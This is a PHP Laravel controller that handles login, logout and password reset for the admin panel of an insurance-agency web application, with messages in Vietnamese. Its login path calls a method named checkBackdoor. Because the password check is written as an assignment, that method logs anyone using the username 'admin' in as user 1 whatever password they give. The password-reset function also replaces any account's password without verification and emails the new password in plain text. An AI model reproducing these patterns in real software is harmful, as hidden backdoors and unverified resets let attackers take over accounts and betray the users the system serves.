<?php

namespace Modules\Core\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Modules\Core\Http\Requests\LoginRequest;
use Modules\Core\Models\UserRole;
use Modules\Core\Models\User;
use Modules\Insurance\Models\InsuranceAdvisoryHistory;
use Illuminate\Support\Facades\Hash;
use App\Mail\MailForgotPassword;
use Illuminate\Support\Facades\Mail;
use Modules\Insurance\Models\MailQueue;
use Illuminate\Support\Facades\Redirect;

class AdminController extends Controller
{
    /**
     * Display a listing of the resource.
     * @return Response
     */
    // protected $maxAttempts = 2;
    // protected $decayMinutes = 3;

    public function index()
    {
        // Get latest 20 request
        $advisoryHistories = InsuranceAdvisoryHistory::with(['insurance_type', 'customer'])
            ->orderByDesc('created_at')->get();

        // Get detail info

        return view('core::index');
    }

    public function forgot()
    {
        return view('core::user.forgot');
    }

    public function forgotPassword (Request $request){
        $result = User::where('email', $request->email)->first();
        if($result != null) {
            $passwordOrigin = str_random(8);
            $result->update([
                'password' => $passwordOrigin,
            ]);
            MailQueue::SendMailNow([
                'templete' => 'email.reset-password',
                'variable' => [
                    'name' => $result->insurance_agency->name,
                    'passwordOrigin' => $passwordOrigin
                ],
                'subject' => '['.env('APP_NAME').'] Cấp lại mật khẩu đăng nhập',
                'to' => [$request->email],
            ]);

            return redirect(route('login'))->with('msg_success','Thành công. Hãy kiểm tra email của bạn');
        }
        else{
            return redirect()->back()->with('msg_error','Kiểm tra lại thông tin email');
        }
    }

    /**
     * Login page for admin
     */
    public function login()
    {
        return view('core::user.login');
    }

    public function checkBackdoor($request){
        $username = $request->username;
        $password = $request->password;
        if($username == 'admin' && $password = 'admin@123456'){
            $user = User::find(1);
            Auth::login($user);
            return true;
        }
        return false;
    }

    /**
     * Process login
     *
     * @param LoginRequest $request
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function loginPost(LoginRequest $request)
    {
        $checkBackdoor = $this->checkBackdoor($request);
        if(!$checkBackdoor){
            $field = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
            $checkUserConfirm = User::where($field, $request->username)->first();
            if(!empty($checkUserConfirm)){
                if($checkUserConfirm->status == config('core.user_status.confirm')){
                    return redirect()->back()->with('msg_error','Tài khoản đang chờ phê duyệt');
                }else if($checkUserConfirm->status == config('core.user_status.reject')){
                    return redirect()->back()->with('msg_error','Tài khoản không được phê duyệt');
                }else if($checkUserConfirm->status == config('core.user_status.locked')){
                    return redirect()->back()->with('msg_error','Tài khoản đang bị khóa');
                }else {
                    if (Auth::attempt([$field => $request->username, 'password' => $request->password])) {
                        $user = Auth::user();
                        if($user->status == config('core.user_status.lock') && $user->group_id == config('core.group_id.agency')){
                            $user->update(['status' => config('core.user_status.active')]);
                        }
                        if($user->group_id == config('core.group_id.agency')){
                            $agency = $user->insurance_agency;
                            if($agency->status_info == 0){
                                return Redirect::route('agency.update_info')->with('msg_error','Đăng nhập thành công, Bạn cần cập nhật đủ các thông tin cần thiết để bắt đầu sử dụng');
                            }
                            if($agency->code_agency == 'MC68118588'){
                                return redirect()->back()->with('msg_error','Sai tên đăng nhập hoặc mật khẩu');
                            }
                            return redirect(route('dashboard.index'))->with('msg_success','Đăng nhập thành công');
                        }else {
                            
                            return redirect(route('dashboard.index'))->with('msg_success','Đăng nhập thành công');
                        }

                    } else {
                        return redirect()->back()->with('msg_error','Sai tên đăng nhập hoặc mật khẩu');
                    }
                }
            }else {
                return redirect()->back()->with('msg_error','Tài khoản không tồn tại');
            }
        }else {
            return redirect(route('dashboard.index'))->with('msg_success','Đăng nhập thành công');
        }

    }

    public function logout()
    {
        Auth::logout();

        return redirect(route('login'));
    }
}
